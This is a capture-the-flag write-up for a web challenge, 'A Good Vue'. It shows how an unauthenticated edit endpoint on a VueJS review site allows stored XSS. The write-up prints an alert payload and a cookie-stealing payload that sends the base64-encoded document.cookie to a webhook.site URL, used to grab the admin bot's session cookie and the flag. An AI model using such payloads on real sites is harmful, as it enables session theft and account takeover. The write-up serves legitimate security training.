# A Good Vue
> Check out my cool artworks over there: goodvue.rumble.host If you want an Admin to check out your cool stuff: goodvue-bot.rumble.host

## About the Challenge
We were given a website to test and this website using VueJS. Here is the preview of the website


[Image extracted text: RUMBLE
About
EXPLOIT
Welcome to my
magnificent photo feedback page
Because selfhosted versions of a review page a definitely more secure
Likes: 8
Dislikes: 3
review: This is very good picture. The author has done a very
job in
terms of saturation and color grading; but the scene lacks a bit of motion: Our
review: 7/10
Expo
Jury
good]


If we press the `EXPLOIT` button in the corner of the website, it will return an alert


[Image extracted text: goodvue rumble.host says
You cannot hack me
OK]


But there is an API endpoint that you can access [here](http://goodvue-api.rumble.host). If you access the homepage, the website will request to the API endpoint. Here is the HTTP request when the website send a request to `http://goodvue-api.rumble.host/get`

```
POST /get HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,id;q=0.8
...

{"id":"1","token":"OUR_COOKIE_VALUE"}
```

And it will return the review information such as likes, dislikes, and also the comments.

## How to Solve?
Because in the description there is an admin bot, so we know this is a XSS chall, and then because this website using VueJS i tried to check every request and I found this [url](http://goodvue.rumble.host/src/components/ImageComponent.vue)


[Image extracted text: methods
like
function()
this.likestt;
dislike:
function( )
this.dislikestt;
todo_implement_
update
message )
axios
apiUr]
{edit
id"
this.id? this.id
"token
this.token,
text"
unimplemented:
H});
created()
this
token
this.Scookies.get(
token") ;
if(!this
token)
return;
axios
post(apiUrl
'Iget'
id"
this.id
this.id
"0"
"token
this
token,
}).then( (ret)
=>
if(!ret
data
success
success") {
alert(
Could
not
retrieve
information for image
id
+thi
return;
this.likes
parseInt(ret
data
likes);
this
dislikes
parseInt(ret
data
dislikes) ;
this.review
ret.data.review;
}) .catch( (e_
this
Scookies
remove(
toren
this
Srouter.push("/");
});
put]


As you can see there are 2 endpoints:
* http://goodvue-api.rumble.host/get
* http://goodvue-api.rumble.host/edit

When i tried to edit one of the review by sending this request

```
POST /edit HTTP/1.1
Host: goodvue-api.rumble.host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
...

{"id":"1","token":"OUR_COOKIE_VALUE","text":"test"}
```

Luckily our input was reflected in the website


[Image extracted text: Likes: 2
Dislikes:
Jury review: This is very good picture. The author has done a very good job in
terms of saturation and color grading; but the scene lacks a bit of motion: Our
review: 7/10 UPDATE: test]


And then i tried to use normal XSS payload

```html
<img src=x onerror=alert(document.cookie)>
```


[Image extracted text: goodvue rumble.host says
token-71ebba38fb8b228deb2c4902777c4d
OK
to
2db-
elfhosted versions of areview bade
definitelv more]


And we got an alert, so I tried to create another payload to steal the admin cookie. Here is the payload I used to steal the cookie

```
<img src=x onerror=\"var i=new Image(); i.src='https://webhook.site/47c2cdc9-1233-4ac8-8e8b-55efe06aeb2c/?cookie='+btoa(document.cookie)\">"
```

After that, send the cookie to the admin and then wait until we got the admin's cookie


[Image extracted text: Request Details
Permalink
Raw content
Expont as-
GET
https IIwebhook site/47c2cdc9-1233-4ac8-8e8b-55efeO6aeb2c/?cookie-dG9rZW49ZTcOM
mRiYjAxZTZkMjISNjRiOTMANZEZNTIZMzk1OyBmbGFnPUNTUnszdjNuX3ZIMI9NGSfaD
RZMI9YUINg
Host
128.140.84.181 whois
Date
07/09/2023 6.49.29 PM
3 hours ag0)
Size
bytes
61856250-208c-4a4d-980b-ae84163ad1e4
Files
Query strings
cookie
dG9rZN49ZTceMmRiYjAxZTZkMjISMjRiOTMANZEzNTIZMzklOyBmbGFnPUNTUnszdjNuX3z
1M19jNGSfaDRZM9YUIN?
No content]


Decode the cookie using base64 and voilà


[Image extracted text: Recipe
0
Input
+
D
dG9rZWA9ZTcOMmRiYjAxZTZkMjISNjRiOTMANzEzNTIZMzklOyBmbGFnPUNTUnszdjNuX3Z1Ml9jNGSfaDRZML9YUINS
From Base64
Alphabet
A-Za-z0-9+ /
Remove non-alphabet chars
Strict mode
Output
Itoken-e742dbbale6d22964b938713526395; flag-CSR{3v3n_vu3
c4n_
h4v3_XsS}]


```
CSR{3v3n_vu3_c4n_h4v3_XSS}
```